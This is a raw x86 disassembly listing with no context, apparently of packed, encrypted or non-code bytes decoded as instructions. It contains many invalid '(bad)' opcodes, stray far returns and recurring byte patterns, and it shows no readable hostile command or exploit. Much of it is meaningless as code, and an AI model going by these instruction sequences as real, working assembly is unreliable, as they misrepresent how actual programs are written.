  406e73:	lahf   
  406e74:	bound  eax,QWORD PTR ds:0x2ecc0d10
  406e7a:	inc    ebp
  406e7b:	je     0x406ec0
  406e7d:	retf   
  406e7e:	inc    ecx
  406e7f:	inc    ebx
  406e80:	inc    eax
  406e81:	inc    eax
  406e82:	add    eax,0x434162
  406e87:	inc    eax
  406e88:	add    BYTE PTR [edx+0x5],ah
  406e8b:	inc    eax
  406e8c:	adc    BYTE PTR [edx+0x40],ah
  406e8f:	inc    ebx
  406e90:	inc    ecx
  406e91:	add    eax,0x4340
  406e96:	add    eax,0x404162
  406e9b:	add    BYTE PTR [eax+0x43],al
  406e9e:	inc    eax
  406e9f:	add    eax,0x658bde7c
  406ea4:	mov    ds:0x2b030a8,al
  406ea9:	fs pop edi
  406eab:	add    dh,BYTE PTR [eax+eiz*8]
  406eae:	mov    al,ds:0x3b20cb9b
  406eb3:	cmp    DWORD PTR [edi+0x2b],ecx
  406eb6:	test   al,0x5f
  406eb8:	mov    esp,0x22423067
  406ebd:	bound  edx,QWORD PTR [eax]
  406ebf:	fcom   QWORD PTR ds:0xf5005ca4
  406ec5:	jb     0x406f30
  406ec7:	xor    DWORD PTR [ebp+0x5],eax
  406eca:	ja     0x406ef9
  406ecc:	xor    cl,BYTE PTR [edi-0x51]
  406ecf:	rcr    BYTE PTR [ecx-0x35],0x1f
  406ed3:	(bad)  
  406ed4:	and    eax,0xb05f62f5
  406ed9:	inc    eax
  406eda:	add    eax,0x400a
  406edf:	inc    ecx
  406ee0:	inc    ebx
  406ee1:	add    eax,0x41784062
  406ee6:	inc    eax
  406ee7:	inc    eax
  406ee8:	add    BYTE PTR [edi],cl
  406eea:	bound  eax,QWORD PTR [ebx+0x0]
  406eed:	add    eax,0x25006240
  406ef2:	inc    eax
  406ef3:	add    eax,0x40254143
  406ef8:	add    eax,0x61620000
  406efd:	imul   eax,DWORD PTR [ebp-0x44],0x1
  406f01:	inc    ecx
  406f02:	stos   BYTE PTR es:[edi],al
  406f03:	mov    al,ds:0x4e43bc7e
  406f08:	test   al,0xd
  406f0a:	lods   eax,DWORD PTR ds:[esi]
  406f0b:	push   edx
  406f0c:	popa   
  406f0d:	bound  ecx,QWORD PTR [eax-0x60]
  406f10:	xor    eax,0x43013f10
  406f15:	test   al,0x7c
  406f17:	outs   dx,BYTE PTR ds:[esi]
  406f18:	retf   
  406f19:	bound  esi,QWORD PTR [edx]
  406f1b:	adc    eax,0x43471060
  406f20:	add    BYTE PTR [eax],al
  406f22:	add    BYTE PTR [ecx+0x40],al
  406f25:	bound  esp,QWORD PTR [esi+0x0]
  406f28:	inc    eax
  406f29:	add    eax,0x5400000
  406f2e:	inc    ecx
  406f2f:	inc    eax
  406f30:	inc    eax
  406f31:	bound  esp,QWORD PTR ds:0x25050043
  406f37:	inc    ecx
  406f38:	inc    ebx
  406f39:	inc    eax
  406f3a:	test   BYTE PTR [eax+0x0],al
  406f3d:	bound  ebx,QWORD PTR [eax+0x62]
  406f40:	inc    ecx
  406f41:	inc    eax
  406f42:	sbb    ebp,DWORD PTR [ebx+eiz*1+0x60]
  406f46:	int    0xe
  406f48:	mov    ebp,0x34342463
  406f4d:	xor    al,0x82
  406f4f:	inc    ecx
  406f50:	adc    bh,bl
  406f52:	push   edx
  406f53:	pop    esi
  406f54:	inc    eax
  406f55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f56:	sub    eax,0xbc5c6220
  406f5b:	das    
  406f5c:	mov    al,ds:0x10015735
  406f61:	bound  eax,QWORD PTR [eax+0x41]
  406f64:	and    eax,0x40000500
  406f69:	inc    ebx
  406f6a:	add    eax,0x40624041
  406f6f:	inc    ebx
  406f70:	add    eax,0x43402541
  406f75:	bound  eax,QWORD PTR [eax+0x43]
  406f78:	int3   
  406f79:	inc    eax
  406f7a:	bound  eax,QWORD PTR [eax]
  406f7c:	inc    ecx
  406f7d:	inc    eax
  406f7e:	inc    eax
  406f7f:	add    eax,0x27626c05
  406f84:	addr16 cmp eax,0x82408028
  406f8a:	inc    esp
  406f8b:	aad    0x34
  406f8d:	ret    
  406f8e:	retf   0x342e
  406f91:	ret    
  406f92:	sub    dl,BYTE PTR [edx+0x4c]
  406f95:	dec    ebp
  406f96:	pop    ds
  406f97:	bound  eax,QWORD PTR [eax+0x25]
  406f9a:	add    BYTE PTR [esi+0x40],ah
  406f9d:	add    eax,0x40404143
  406fa2:	inc    ebx
  406fa3:	add    BYTE PTR [eax],al
  406fa5:	add    BYTE PTR [edx-0x34],ah
  406fa8:	inc    eax
  406fa9:	add    eax,0x40004041
  406fae:	inc    ecx
  406faf:	int3   
  406fb0:	add    BYTE PTR [ebx-0x7c],al
  406fb3:	add    eax,0x5406240
  406fb8:	bound  eax,QWORD PTR [eax-0x346f43f3]
  406fbe:	add    eax,0x4003ef34
  406fc3:	inc    ecx
  406fc4:	mov    edi,0x7407b42
  406fc9:	pop    ecx
  406fca:	pop    ds
  406fcb:	pop    eax
  406fcc:	jo     0x406f54
  406fce:	add    al,0xac
  406fd0:	test   BYTE PTR [ecx],0x41
  406fd3:	cwde   
  406fd4:	inc    edx
  406fd5:	retf   0x3d02
  406fd8:	pop    ebp
  406fd9:	pop    edx
  406fda:	pusha  
  406fdb:	push   ebx
  406fdc:	js     0x407040
  406fde:	inc    esp
  406fdf:	inc    eax
  406fe0:	bound  ebx,QWORD PTR [eax+0x41]
  406fe3:	add    eax,0x40404340
  406fe8:	inc    ebx
  406fe9:	inc    eax
  406fea:	test   BYTE PTR [eax],al
  406fec:	add    eax,0x40624041
  406ff1:	inc    eax
  406ff2:	add    BYTE PTR [edx+0x5],ah
  406ff5:	inc    ebx
  406ff6:	add    BYTE PTR [eax+0x78],al
  406ff9:	inc    ecx
  406ffa:	add    BYTE PTR [eax+0x41],bl
  406ffd:	(bad)  
  406fff:	repz or BYTE PTR [ebx],al
  407002:	sub    al,cl
  407004:	push   eax
  407005:	push   edx
  407006:	push   ebx
  407007:	sub    DWORD PTR es:[ecx],ebp
  40700a:	push   eax
  40700b:	(bad)  
  40700d:	lock dec eax
  40700f:	call   0x34c9:0x5c6660ee
  407016:	sub    dh,dh
  407018:	ficom  DWORD PTR [esi]
  40701a:	adc    al,0xbd
  40701c:	push   edx
  40701d:	cmp    ah,al
  40701f:	xchg   DWORD PTR [ebp+0x40a83540],eax
  407025:	inc    edx
  407026:	outs   dx,BYTE PTR ds:[esi]
  407027:	dec    ebx
  407028:	addr16 push esp
  40702a:	or     BYTE PTR [ebx],0xbc
  40702d:	xchg   esp,eax
  40702e:	fadd   QWORD PTR [edi-0x71]
  407031:	adc    al,ch
  407033:	xor    ecx,DWORD PTR [edx+ebp*2]
  407036:	adc    ch,BYTE PTR fs:[ebp+0x40]
  40703a:	inc    ecx
  40703b:	or     eax,DWORD PTR [eax-0x7c]
  40703e:	add    ah,cl
  407040:	bound  eax,QWORD PTR ds:0xcc840f41
  407046:	inc    ebx
  407047:	add    BYTE PTR [eax+0x0],al
  40704a:	inc    eax
  40704b:	inc    eax
  40704c:	inc    eax
  40704d:	int3   
  40704e:	add    BYTE PTR ds:0x62404341,al
  407054:	pop    eax
  407055:	add    BYTE PTR [ebx+0x40],al
  407058:	bound  ecx,QWORD PTR [edi]
  40705a:	inc    eax
  40705b:	xor    bh,BYTE PTR [ecx]
  40705d:	mov    eax,0x4205836c
  407062:	sub    al,0x40
  407064:	push   esi
  407065:	test   al,0x93
  407067:	push   ds
  407068:	inc    eax
  407069:	shl    BYTE PTR [edx-0x4c],0xf5
  40706d:	adc    BYTE PTR [edi-0x4f43ec7d],ah
  407073:	cmp    eax,0x413db422
  407078:	inc    eax
  407079:	div    BYTE PTR [esi-0x3d]
  40707c:	sub    BYTE PTR ds:0x536503d1,al
  407082:	and    edx,ebx
  407084:	add    BYTE PTR [eax],al
  407086:	inc    eax
  407087:	inc    eax
  407088:	cmovno eax,DWORD PTR ds:0x40056243
  40708f:	int3   
  407090:	add    ah,cl
  407092:	inc    eax
  407093:	inc    eax
  407094:	bound  eax,QWORD PTR [ecx+0x0]
  407097:	add    BYTE PTR [edi],cl
  407099:	inc    ebx
  40709a:	inc    eax
  40709b:	inc    eax
  40709c:	add    BYTE PTR [ecx+0x43],al
  40709f:	add    eax,0x40256240
  4070a4:	bound  eax,QWORD PTR [eax]
  4070a6:	retfw  
  4070a8:	or     eax,0xb0227832
  4070ad:	stos   DWORD PTR es:[edi],eax
  4070ae:	cmp    BYTE PTR [ebx-0x3d],al
  4070b1:	pop    es
  4070b2:	and    ebx,eax
  4070b4:	adc    eax,0xa844a843
  4070b9:	sbb    BYTE PTR [ecx-0x44],al
  4070bc:	leave  
  4070bd:	jg     0x407104
  4070bf:	cld    
  4070c0:	jb     0x4070c2
  4070c2:	push   edx
  4070c3:	mov    eax,ds:0x642a6c69
  4070c8:	imul   BYTE PTR [eax*1+0x4140cc00]
  4070cf:	inc    eax
  4070d0:	inc    ebx
  4070d1:	bound  esp,QWORD PTR ds:0x41400043
  4070d7:	add    BYTE PTR [eax],al
  4070d9:	add    eax,0x43624062
  4070de:	inc    ecx
  4070df:	inc    eax
  4070e0:	inc    eax
  4070e1:	inc    eax
  4070e2:	add    eax,0x40624340
  4070e7:	add    eax,0x40664140
  4070ec:	mov    al,ds:0x4166fb32
  4070f1:	test   al,0xcb
  4070f3:	mov    esi,0x10626225
  4070f8:	or     DWORD PTR [edx+0x3c],eax
  4070fb:	xor    al,0x44
  4070fd:	inc    esp
  4070fe:	lds    ebx,FWORD PTR [eax+0xbc12a00]
  407104:	loope  0x40714c
  407106:	push   esp
  407107:	bound  eax,QWORD PTR fs:[ecx+0x29]
  40710b:	inc    ebx
  40710c:	add    BYTE PTR ds:0x41107840,al
  407112:	bound  eax,QWORD PTR [eax+0x40]
  407115:	sldt   WORD PTR [eax-0x34]
  407119:	js     0x40717d
  40711b:	add    eax,0x40664143
  407120:	inc    ebx
  407121:	add    BYTE PTR [ecx+0x5],al
  407124:	js     0x407166
  407126:	bound  eax,QWORD PTR [eax+0x0]
  407129:	inc    eax
  40712a:	pop    es
  40712b:	push   ebx
  40712c:	and    ebx,ecx
  40712e:	push   ds
  40712f:	test   eax,0xa181ec53
  407134:	push   0x48
  407136:	shl    BYTE PTR [eax+0x41400f34],1
  40713c:	mov    DWORD PTR [ecx-0x30],0x2a12d1
  407143:	pusha  
  407144:	scas   al,BYTE PTR es:[edi]
  407145:	inc    esp
  407146:	test   al,0x7e
  407148:	mov    ah,0xb9
  40714a:	outs   dx,BYTE PTR es:[esi]
  40714c:	loop   0x407176
  40714e:	xor    esp,DWORD PTR [esi+eax*8+0x53]
  407152:	inc    edi
  407153:	outs   dx,DWORD PTR ds:[esi]
  407154:	(bad)  
  407155:	fsub   QWORD PTR [esi+0x14]
  407158:	adc    al,BYTE PTR cs:[ecx]
  40715b:	inc    ecx
  40715c:	inc    ebx
  40715d:	inc    eax
  40715e:	inc    eax
  40715f:	add    eax,0x434162
  407164:	inc    eax
  407165:	add    BYTE PTR [edx+0x5],ah
  407168:	inc    eax
  407169:	adc    BYTE PTR [edx+0x40],ah
  40716c:	inc    ebx
  40716d:	inc    ecx
  40716e:	add    eax,0x4340
  407173:	add    eax,0x404162
  407178:	add    BYTE PTR [eax+0x43],al
  40717b:	inc    eax
  40717c:	add    eax,0x63fccb20
  407181:	je     0x4071d4
  407183:	mov    ebx,0xa8487e13
  407188:	shl    DWORD PTR [edx+0x44],0xd4
  40718c:	test   edx,edi
  40718e:	adc    eax,DWORD PTR [eax+0x54]
  407191:	and    al,0xc9
  407193:	mov    es,WORD PTR [ebx+0x7d]
  407196:	fisubr WORD PTR [edx]
  407198:	int    0x38
  40719a:	test   BYTE PTR es:[ecx-0x4beeac9f],0x66
  4071a2:	mov    ah,0x50
  4071a4:	sbb    ah,BYTE PTR [ebx+edx*8]
  4071a7:	inc    eax
  4071a8:	or     eax,0x81920d55
  4071ad:	xor    ch,BYTE PTR [eax+0x433ccb01]
  4071b3:	mov    al,ds:0x251128af
  4071b8:	inc    ebx
  4071b9:	arpl   WORD PTR [eax+0x0],ax
  4071bc:	add    BYTE PTR [ecx+0x43],al
  4071bf:	add    eax,0x41784062
  4071c4:	inc    eax
  4071c5:	inc    eax
  4071c6:	add    BYTE PTR [edi],cl
  4071c8:	bound  eax,QWORD PTR [ebx+0x0]
  4071cb:	add    eax,0x25006240
  4071d0:	inc    eax
  4071d1:	add    eax,0x40254143
  4071d6:	add    eax,0x1a620000
  4071db:	xchg   esp,eax
  4071dc:	dec    ebx
  4071dd:	and    al,0xb0
  4071df:	sbb    BYTE PTR [ebx-0x7ffe3f44],0x2f
  4071e6:	inc    ecx
  4071e7:	dec    ebp
  4071e8:	sbb    BYTE PTR [eax-0x8],ah
  4071eb:	in     eax,0x60
  4071ed:	fs gs retf 
  4071f0:	arpl   WORD PTR [eax],si
  4071f2:	inc    eax
  4071f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071f4:	mov    al,cs:0x6a653630
  4071fa:	mov    cl,0xa4
  4071fc:	xor    DWORD PTR [edi],0x5e74a02
  407202:	ins    BYTE PTR es:[edi],dx
  407203:	xchg   edi,eax
  407204:	arpl   WORD PTR [esi+0x3a],bp
  407207:	add    eax,0x80cf021
  40720c:	add    DWORD PTR [ecx],esp
  40720e:	stc    
  40720f:	sub    al,0x52
  407211:	xchg   edx,eax
  407212:	imul   eax,DWORD PTR [ebx+0x0],0x0
  407216:	add    BYTE PTR [ecx+0x40],al
  407219:	bound  esp,QWORD PTR [esi+0x0]
  40721c:	inc    eax
  40721d:	add    eax,0x5400000
  407222:	inc    ecx
  407223:	inc    eax
  407224:	inc    eax
  407225:	bound  esp,QWORD PTR ds:0x25050043
  40722b:	inc    ecx
  40722c:	inc    ebx
  40722d:	inc    eax
  40722e:	test   BYTE PTR [eax+0x0],al
  407231:	bound  ebx,QWORD PTR [eax+0x62]
  407234:	inc    ecx
  407235:	inc    eax
  407236:	mov    edx,es
  407238:	add    ah,BYTE PTR [edx+0x63]
  40723b:	pop    esp
  40723c:	test   al,0x75
  40723e:	mov    esi,0x48b8a301
  407243:	sub    al,0x61
  407245:	(bad)  
  407246:	mul    DWORD PTR [ebx+ebx*4-0x57]
  40724a:	add    ch,al
  40724c:	(bad)  
  40724d:	inc    eax
  40724e:	jmp    0x407251
  407250:	dec    esi
  407251:	test   eax,0xb0624cc9
  407256:	sbb    BYTE PTR [ecx-0x1d],al
  407259:	bound  esi,QWORD PTR [edx+ebp*1-0x7ea99821]
  407260:	fs addr16 add eax,0x94be3502
  407267:	outs   dx,DWORD PTR ds:[esi]
  407268:	or     DWORD PTR [ebx+ecx*8+0x10],edi
  40726c:	bound  eax,QWORD PTR [eax+0x41]
  40726f:	and    eax,0x40000500
  407274:	inc    ebx
  407275:	add    eax,0x40624041
  40727a:	inc    ebx
  40727b:	add    eax,0x43402541
  407280:	bound  eax,QWORD PTR [eax+0x43]
  407283:	int3   
  407284:	inc    eax
  407285:	bound  eax,QWORD PTR [eax]
  407287:	inc    ecx
  407288:	inc    eax
  407289:	inc    eax
  40728a:	add    eax,0x41806405
  40728f:	xchg   BYTE PTR [ecx-0x2dbcadc8],al
  407295:	lds    ebx,FWORD PTR [ebp+0x5c81ffc5]
  40729b:	repnz lock inc ecx
  40729e:	addr16 mov dl,0x1a
  4072a1:	(bad)  
  4072a2:	xor    eax,0x449f62c0
  4072a7:	jg     0x40722f
  4072a9:	add    eax,0x3cc56240
  4072ae:	int    0xc6
  4072b0:	adc    al,0x6a
  4072b2:	pop    edi
  4072b3:	inc    ebp
  4072b4:	bound  eax,QWORD PTR [eax+0x25]
  4072b7:	add    BYTE PTR [esi+0x40],ah
  4072ba:	add    eax,0x40404143
  4072bf:	inc    ebx
  4072c0:	add    BYTE PTR [eax],al
  4072c2:	add    BYTE PTR [edx-0x34],ah
  4072c5:	inc    eax
  4072c6:	add    eax,0x40004041
  4072cb:	inc    ecx
  4072cc:	int3   
  4072cd:	add    BYTE PTR [ebx-0x7c],al
  4072d0:	add    eax,0x5406240
  4072d5:	bound  ebp,QWORD PTR [edi-0x8]
  4072d8:	int    0x1
  4072da:	or     al,0x1
  4072dc:	mov    ebx,0xba49d580
  4072e1:	mov    ebp,0x27546c83
  4072e6:	add    ch,BYTE PTR [ebx-0x7ebadbb2]
  4072ec:	dec    esp
  4072ed:	aas    
  4072ee:	xor    al,0x42
  4072f0:	cmp    eax,0x5e57015e
  4072f5:	test   al,0x47
  4072f7:	xor    eax,0x4fa7cb
  4072fc:	cmp    DWORD PTR [eax+0x62],eax
  4072ff:	pop    eax
  407300:	inc    ecx
  407301:	add    eax,0x40404340
  407306:	inc    ebx
  407307:	inc    eax
  407308:	test   BYTE PTR [eax],al
  40730a:	add    eax,0x40624041
  40730f:	inc    eax
  407310:	add    BYTE PTR [edx+0x5],ah
  407313:	inc    ebx
  407314:	add    BYTE PTR [eax+0x78],al
  407317:	inc    ecx
  407318:	add    BYTE PTR [eax+0x41],bl
  40731b:	bound  edx,QWORD PTR [ecx]
  40731d:	cmp    al,BYTE PTR [eax+0x50]
  407320:	mov    ebx,0x41fa3000
  407325:	mov    ebp,0x36984c7a
  40732a:	mov    esi,0xc3f841b8
  40732f:	leave  
  407330:	sub    DWORD PTR [ebp+0x3a],eax
  407333:	test   al,0x20
  407335:	push   edi
  407336:	mov    esp,0x8100a026
  40733b:	adc    BYTE PTR [ebp+0x46],cl
  40733e:	adc    eax,0x60328bbc
  407343:	mov    al,0xcb
  407345:	xor    al,0xcb
  407347:	or     eax,0x4081fa0e
  40734c:	test   BYTE PTR [eax],al
  40734e:	int3   
  40734f:	bound  eax,QWORD PTR ds:0xcc840f41
  407355:	inc    ebx
  407356:	add    BYTE PTR [eax+0x0],al
  407359:	inc    eax
  40735a:	inc    eax
  40735b:	inc    eax
  40735c:	int3   
  40735d:	add    BYTE PTR ds:0x62404341,al
  407363:	pop    eax
  407364:	add    BYTE PTR [ebx+0x40],al
  407367:	bound  ecx,QWORD PTR [edi]
  407369:	inc    eax
  40736a:	inc    edx
  40736b:	dec    esp
  40736c:	in     al,dx
  40736d:	mov    eax,0xa56ace44
  407372:	in     al,0x2
  407374:	cmp    al,0x49
  407376:	inc    eax
  407377:	sbb    BYTE PTR [ebx+eax*4+0x79634144],al
  40737e:	test   al,0xa6
  407380:	and    eax,0xb5416240
  407385:	mov    al,0x71
  407387:	or     DWORD PTR [edx+0x0],ecx
  40738a:	cld    
  40738b:	sub    BYTE PTR [eax+0x1adc962],ch
  407391:	and    al,0x88
  407393:	call   0x1e4e2bd8
  407398:	xor    BYTE PTR [edi+0x62],al
  40739b:	loope  0x4073c7
  40739d:	or     eax,0x8103ca25
  4073a2:	rol    DWORD PTR [eax],1
  4073a4:	add    BYTE PTR [eax+0x40],al
  4073a7:	cmovno eax,DWORD PTR ds:0x40056243
  4073ae:	int3   
  4073af:	add    ah,cl
  4073b1:	inc    eax
  4073b2:	inc    eax
  4073b3:	bound  eax,QWORD PTR [ecx+0x0]
  4073b6:	add    BYTE PTR [edi],cl
  4073b8:	inc    ebx
  4073b9:	inc    eax
  4073ba:	inc    eax
  4073bb:	add    BYTE PTR [ecx+0x43],al
  4073be:	add    eax,0x40256240
  4073c3:	bound  eax,QWORD PTR [eax]
  4073c5:	dec    eax
  4073c6:	inc    ecx
  4073c7:	inc    ebp
  4073c8:	inc    eax
  4073c9:	rol    bl,1
  4073cb:	add    ah,BYTE PTR [ebp+edx*1+0x34a83e46]
  4073d2:	add    al,BYTE PTR [ecx+0x5ebccb62]
  4073d8:	addr16 pop ss
  4073da:	and    al,BYTE PTR [esi+0x7]
  4073dd:	push   eax
  4073de:	pop    esi
  4073df:	stos   DWORD PTR es:[edi],eax
  4073e0:	inc    edx
  4073e1:	fwait
  4073e2:	inc    eax
  4073e3:	sbb    DWORD PTR [ecx],0x4cb0ab08
  4073e9:	push   0x35
  4073eb:	mov    bh,0xf1
  4073ed:	leave  
  4073ee:	sbb    dl,BYTE PTR ds:0x43f8aac9
  4073f4:	bound  eax,QWORD PTR [eax-0x7a]
  4073f7:	leave  
  4073f8:	es jae 0x407447
  4073fb:	add    DWORD PTR [ecx+eax*1+0x40cc0005],eax
  407402:	inc    ecx
  407403:	inc    eax
  407404:	inc    ebx
  407405:	bound  esp,QWORD PTR ds:0x41400043
  40740b:	add    BYTE PTR [eax],al
  40740d:	add    eax,0x43624062
  407412:	inc    ecx
  407413:	inc    eax
  407414:	inc    eax
  407415:	inc    eax
  407416:	add    eax,0x40624340
  40741b:	add    eax,0x40664140
  407420:	popa   
  407421:	add    al,0xb4
  407423:	push   cs
  407424:	and    BYTE PTR [ebx+eax*8+0x25],0x20
  407429:	adc    DWORD PTR [edx-0x37],eax
  40742c:	ins    DWORD PTR es:[edi],dx
  40742d:	sub    DWORD PTR [edi+0x494465e4],0x362a4440
  407437:	dec    ebp
  407438:	ins    BYTE PTR es:[edi],dx
  407439:	mov    esp,gs
  40743b:	inc    eax
  40743c:	add    BYTE PTR [ecx],al
  40743e:	test   al,0xcb
  407440:	cmp    BYTE PTR [ebp*2-0x2e8c87c0],dh
  407447:	dec    ebx
  407448:	arpl   WORD PTR [ebx-0x44],cx
  40744b:	or     al,0x40
  40744d:	add    BYTE PTR [ebx+0x0],0x5
  407451:	inc    eax
  407452:	js     0x407464
  407454:	inc    ecx
  407455:	bound  eax,QWORD PTR [eax+0x40]
  407458:	sldt   WORD PTR [eax-0x34]
  40745c:	js     0x4074c0
  40745e:	add    eax,0x40664143
  407463:	inc    ebx
  407464:	add    BYTE PTR [ecx+0x5],al
  407467:	js     0x4074a9
  407469:	bound  eax,QWORD PTR [eax+0x0]
  40746c:	inc    eax
  40746d:	cmc    
  40746e:	add    esi,DWORD PTR [edx]
  407470:	xor    eax,0x2574400d
  407475:	arpl   WORD PTR [eax],bp
  407477:	hlt    
  407478:	adc    cl,cl
  40747a:	adc    al,BYTE PTR [eax+0x7e]
  40747d:	ins    BYTE PTR es:[edi],dx
  40747e:	bound  esp,QWORD PTR [ebx+0x2]
  407481:	es inc eax
  407483:	jo     0x407486
  407485:	add    DWORD PTR ds:0x15507be0,0xc9c341e0
  40748f:	les    ecx,FWORD PTR [esp+ecx*2+0x40]
  407493:	inc    eax
  407494:	add    DWORD PTR [ecx+0x43],0x40
  407498:	inc    eax
  407499:	add    eax,0x434162
  40749e:	inc    eax
  40749f:	add    BYTE PTR [edx+0x5],ah
  4074a2:	inc    eax
  4074a3:	adc    BYTE PTR [edx+0x40],ah
  4074a6:	inc    ebx
  4074a7:	inc    ecx
  4074a8:	add    eax,0x4340
  4074ad:	add    eax,0x404162
  4074b2:	add    BYTE PTR [eax+0x43],al
  4074b5:	inc    eax
  4074b6:	add    eax,0x431242bc
  4074bb:	retf   
  4074bc:	outs   dx,BYTE PTR ds:[esi]
  4074bd:	jb     0x4074f8
  4074bf:	inc    ecx
  4074c0:	into   
  4074c1:	bound  ebp,QWORD PTR [esi+eiz*1+0x26814040]
  4074c8:	and    DWORD PTR [ebx-0x68],esp
  4074cb:	inc    ebp
  4074cc:	push   cs
  4074cd:	ins    DWORD PTR es:[edi],dx
  4074ce:	mov    bh,0x48
  4074d0:	test   al,0xec
  4074d2:	arpl   WORD PTR [ebx+0x40],ax
  4074d5:	inc    eax
  4074d6:	popa   
  4074d7:	fs jl  0x4074aa
  4074da:	dec    ebx
  4074db:	and    al,0xf
  4074dd:	add    DWORD PTR [ebx],eax
  4074df:	sbb    edx,esi
  4074e1:	bound  esi,QWORD PTR [ecx+edx*4]
  4074e4:	inc    eax
  4074e5:	inc    eax
  4074e6:	iret   
  4074e7:	fsub   QWORD PTR [edx+0x3c]
  4074ea:	mov    edi,0x41000040
  4074ef:	inc    ebx
  4074f0:	add    eax,0x41784062
  4074f5:	inc    eax
  4074f6:	inc    eax
  4074f7:	add    BYTE PTR [edi],cl
  4074f9:	bound  eax,QWORD PTR [ebx+0x0]
  4074fc:	add    eax,0x25006240
  407501:	inc    eax
  407502:	add    eax,0x40254143
  407507:	add    eax,0xb620000
  40750c:	or     DWORD PTR [ebx],edx
  40750e:	pop    es
  40750f:	arpl   WORD PTR [eax+eax*8+0x4c],bx
  407513:	rol    DWORD PTR [eax+0x40],0xc7
  407517:	add    eax,0xf93d6b30
  40751c:	adc    al,0x40
  40751e:	add    DWORD PTR [edi+0x54c31689],0x29441240
  407528:	xor    al,0x79
  40752a:	pop    esp
  40752b:	mov    DWORD PTR [ebx],0x43380042
  407531:	add    BYTE PTR [eax],al
  407533:	add    BYTE PTR [ecx+0x40],al
  407536:	bound  esp,QWORD PTR [esi+0x0]
  407539:	inc    eax
  40753a:	add    eax,0x5400000
  40753f:	inc    ecx
  407540:	inc    eax
  407541:	inc    eax
  407542:	bound  esp,QWORD PTR ds:0x25050043
  407548:	inc    ecx
  407549:	inc    ebx
  40754a:	inc    eax
  40754b:	test   BYTE PTR [eax+0x0],al
  40754e:	bound  ebx,QWORD PTR [eax+0x62]
  407551:	inc    ecx
  407552:	inc    eax
  407553:	xor    eax,0x40b24465
  407558:	add    dh,BYTE PTR [eax]
  40755a:	dec    DWORD PTR [edi+eax*1+0x65]
  40755e:	arpl   WORD PTR ds:0xd06234a9,dx
  407564:	nop
  407565:	pushf  
  407566:	test   BYTE PTR [eax+0x48],al
  407569:	test   BYTE PTR [ebx],ch
  40756b:	nop
  40756c:	bound  ecx,QWORD PTR fs:[edx+edx*1]
  407570:	sub    BYTE PTR [edi],0x4
  407573:	lods   al,BYTE PTR ds:[esi]
  407574:	or     BYTE PTR [eax-0x33],0x40
  407578:	and    esp,DWORD PTR [ebp+0x63]
  40757b:	push   ds
  40757c:	xchg   esp,eax
  40757d:	jbe    0x40758f
  40757f:	bound  eax,QWORD PTR [eax+0x41]
  407582:	and    eax,0x40000500
  407587:	inc    ebx
  407588:	add    eax,0x40624041
  40758d:	inc    ebx
  40758e:	add    eax,0x43402541
  407593:	bound  eax,QWORD PTR [eax+0x43]
  407596:	int3   
  407597:	inc    eax
  407598:	bound  eax,QWORD PTR [eax]
  40759a:	inc    ecx
  40759b:	inc    eax
  40759c:	inc    eax
  40759d:	add    eax,0x7f144105
  4075a2:	add    ah,ah
  4075a4:	cmp    al,BYTE PTR [edx+0x1402a51]
  4075aa:	mov    ch,0xa8
  4075ac:	arpl   WORD PTR [eax+0x53],di
  4075af:	adc    BYTE PTR [ebx],dl
  4075b1:	dec    ecx
  4075b2:	pusha  
  4075b3:	adc    dl,BYTE PTR [esi+0x62]
  4075b6:	std    
  4075b7:	jno    0x4075f9
  4075b9:	add    DWORD PTR [edi],esi
  4075bb:	ins    BYTE PTR es:[edi],dx
  4075bc:	aam    0x6e
  4075be:	test   al,0x9b
  4075c0:	push   cs
  4075c1:	imul   eax,DWORD PTR [edx],0xffffff82
  4075c4:	mov    WORD PTR [ecx+edx*1+0x62],?
  4075c8:	inc    eax
  4075c9:	xor    eax,0x63d0422e
  4075ce:	jl     0x4075fa
  4075d0:	or     DWORD PTR ds:0x51a71125,eax
  4075d6:	or     BYTE PTR [eax+0x38026840],bh
  4075dc:	test   eax,0x254062
  4075e1:	inc    ax
  4075e3:	add    eax,0x40404143
  4075e8:	inc    ebx
  4075e9:	add    BYTE PTR [eax],al
  4075eb:	add    BYTE PTR [edx-0x34],ah
  4075ee:	inc    eax
  4075ef:	add    eax,0x40004041
  4075f4:	inc    ecx
  4075f5:	int3   
  4075f6:	add    BYTE PTR [ebx-0x7c],al
  4075f9:	add    eax,0x5406240
  4075fe:	bound  edi,QWORD PTR [edx+eax*2]
  407601:	add    bl,BYTE PTR [edi]
  407603:	xor    DWORD PTR [edx],0x8d75b86e
  407609:	or     al,0x40
  40760b:	dec    esp
  40760c:	push   ebx
  40760d:	and    bl,0x66
  407610:	sub    cl,cl
  407612:	adc    al,0x81
  407614:	adc    DWORD PTR [edx-0x19],0x40261028
  40761b:	inc    ebx
  40761c:	enter  0x7f26,0x62
  407620:	mov    eax,0x98010b4
  407625:	sub    BYTE PTR [esp+edx*8],dh
  407628:	xchg   ecx,eax
  407629:	adc    eax,0x62f53540
  40762e:	fs mov esp,0x4f19cb82
  407634:	add    ebp,eax
  407636:	popa   
  407637:	bound  ebp,QWORD PTR [ebx+0x40]
  40763a:	bound  ebx,QWORD PTR [eax+0x41]
  40763d:	add    eax,0x40404340
  407642:	inc    ebx
  407643:	inc    eax
  407644:	test   BYTE PTR [eax],al
  407646:	add    eax,0x40624041
  40764b:	inc    eax
  40764c:	add    BYTE PTR [edx+0x5],ah
  40764f:	inc    ebx
  407650:	add    BYTE PTR [eax+0x78],al
  407653:	inc    ecx
  407654:	add    BYTE PTR [eax+0x41],bl
  407657:	bound  ecx,QWORD PTR [ecx+0x4f178140]
  40765d:	cld    
  40765e:	adc    eax,0x131273d9
  407663:	push   cs
  407664:	sbb    DWORD PTR [ebx-0x24],esp
  407667:	js     0x4076b1
  407669:	inc    eax
  40766a:	ret    0xe81
  40766d:	xor    eax,DWORD PTR [ebp+0x2]
  407670:	dec    ebx
  407671:	add    ebp,DWORD PTR [ecx]
  407673:	das    
  407674:	xchg   sp,ax
  407676:	loopne 0x40766f
  407678:	loopne 0x4076ba
  40767a:	mov    dh,0x3
  40767c:	out    dx,eax
  40767d:	push   esp
  40767e:	ins    BYTE PTR es:[edi],dx
  40767f:	dec    edi
  407680:	xor    al,BYTE PTR ds:0x84407666
  407686:	add    ah,cl
  407688:	bound  eax,QWORD PTR ds:0xcc840f41
  40768e:	inc    ebx
  40768f:	add    BYTE PTR [eax+0x0],al
  407692:	inc    eax
  407693:	inc    eax
  407694:	inc    eax
  407695:	int3   
  407696:	add    BYTE PTR ds:0x62404341,al
  40769c:	pop    eax
